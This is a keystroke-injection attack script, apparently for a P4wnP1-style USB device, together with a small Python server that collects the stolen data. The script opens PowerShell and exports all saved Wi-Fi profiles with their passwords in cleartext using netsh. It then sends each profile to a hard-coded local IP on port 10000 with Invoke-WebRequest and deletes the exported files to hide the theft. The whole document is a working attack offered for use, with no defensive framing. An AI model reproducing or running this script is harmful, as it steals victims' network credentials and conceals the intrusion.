/*
Exfiltrate Cleartext WLAN Passwords and earase export file after transmission
author: Klau5t4ler0x90

Remeber: Befor script running, start pythonwesever on port 10000!

server.py
----

#!/usr/bin/env python3
from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse
import html
import os
import datetime

PORT = 10000

class RequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        params = urllib.parse.parse_qs(parsed.query)
        filename = os.path.basename(params.get('datei', ['default.html'])[0])
        data = params.get('data', [''])[0]

        filepath = os.path.join(os.getcwd(), filename)
        timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        entry = f"""<div style="border:1px solid #ccc; padding:10px; margin:10px;">
<pre>{html.escape(data)}</pre>
<small>Empfangen am: {timestamp}</small>
</div>\n"""

        if not os.path.exists(filepath):
            with open(filepath, 'w') as f:
                f.write("<html><body>\n" + entry + "</body></html>")
            msg = f"Neue Datei erstellt: {filename}"
        else:
            with open(filepath, 'r') as f:
                content = f.read()
            content = content.replace("</body></html>", entry + "</body></html>")
            with open(filepath, 'w') as f:
                f.write(content)
            msg = f"Daten ergänzt in Datei: {filename}"

        self.send_response(200)
        self.end_headers()
        self.wfile.write(msg.encode('utf-8'))

if __name__ == '__main__':
    print(f"Starte Server auf Port {PORT}")
    HTTPServer(('', PORT), RequestHandler).serve_forever()

----

This Server logs all requestes you send in a file. You can create filename by yourself, for example:
- curl "http://172.24.0.1:10000/datei.php?datei=neu1.html&data=Another%20Secret"
 or
- curl "http://172.16.0.1:10000/datei.php?datei=neu1.html&data=Place%20for%secrets"


*/

ps_wow64='%SystemRoot%\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe'
ps="powershell.exe"

// sets typing speed to "natural"
function natural() {
  typingSpeed(100,150)	// Wait 100ms between key strokes + an additional random value between 0ms and 150ms (natural)
}

// sets typing speed as fast as possible
function fast() {
  typingSpeed(0,0)
}

// Open an interactive PowerShell console (Windows)
function startPS() {
	press("GUI r");
	delay(500);
	type("powershell\n")
}

// Uses search bar and CTRL+SHIFT+ENTER to run given program as admin (assumes user is admin, only confirms UAC dialog)
function win10AsAdmin(program) {
  press("GUI"); //open search
  delay(200);
  type(program); //enter target binary
  delay(500); // wait for search to finish
  press("CTRL SHIFT ENTER"); //start with CTRL+SHIFT+ENTER (run as admin)
  delay(500); //wait for confirmation dialog (no check if a password is required, assume login user is admin)
  press("SHIFT TAB"); //switch to dialog confirmation
  press("ENTER");
}

function getWlan() {
  //type("cd $env:TEMP\n");
  //press("ENTER");
  //delay(300);

  // 1. WLAN-Profile mit Klartext-Schlüssel exportieren
  type("netsh wlan export profile key=clear\n");
  press("ENTER");
  delay(1000);

  // 2. Alle XMLs einlesen, URL-encodieren und senden
  type("Add-Type -AssemblyName System.Web\n");
  press("ENTER");
  delay(200);
  type("Get-ChildItem -Filter '*.xml' | ForEach-Object {\n");
  press("ENTER");
  delay(200);
  type("  $raw = Get-Content $_.FullName -Raw\n");
  press("ENTER");
  delay(200);
  type("  $encoded = [System.Web.HttpUtility]::UrlEncode($raw)\n");
  press("ENTER");
  delay(200);
  type("  $url = 'http://172.16.0.1:10000/?datei=neu1.html&data=' + $encoded\n");
  press("ENTER");
  delay(200);
  type("  try { Invoke-WebRequest -Uri $url -UseBasicParsing } catch {}\n");
  press("ENTER");
  delay(200);
  type("  Remove-Item $_.FullName -Force\n");
  press("ENTER");
  type("}\n");
  press("ENTER");
}


layout('de');			// US keyboard layout
fast();

startPS();
delay(500);
getWlan();
